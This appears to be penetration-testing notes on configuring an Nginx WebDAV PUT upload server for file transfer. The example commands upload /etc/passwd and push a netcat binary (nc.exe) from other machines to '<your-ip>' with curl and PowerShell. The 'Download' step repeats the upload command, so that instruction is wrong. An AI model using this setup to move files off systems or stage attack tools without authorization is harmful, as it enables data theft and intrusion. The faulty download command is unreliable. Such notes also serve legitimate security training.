
# NGINX
Creating a Nginx server
1. Create directory to handle uploaded files
	- `sudo mkdir -p /var/www/uploads/SecretUploadDirectory`
2. Change owner to www-data
	- `sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory`
3. Create the Nginx  config file
	- `sudo touch /etc/nginx/sites-available/upload.conf`

```c
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

4. Symlink our Site to the sites-enabled Directory
	- `sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/`
5. Start Nginx
	- `sudo systemctl restart nginx.service`
6. Verify errors if any
	- `tail -2 /var/log/nginx/error.log`
7. Delete default config to stop binding to 80 if that's the issue
	- `sudo rm /etc/nginx/sites-enabled/default`
8. Then can test upload file to this server with curl (locally)
	- `curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt`
9. From other machine, can upload and download
	- Linux upload: 
		- `curl -T /path/to/file http://<your-ip>:9001/SecretUploadDirectory/filename.bin
	- Windows upload:
		- `Invoke-WebRequest -Uri http://<your-ip>:9001/SecretUploadDirectory/nc.exe -Method Put -InFile .\nc.exe
	- Download:
		- `Invoke-WebRequest -Uri http://<your-ip>:9001/SecretUploadDirectory/nc.exe -Method Put -InFile .\nc.exe`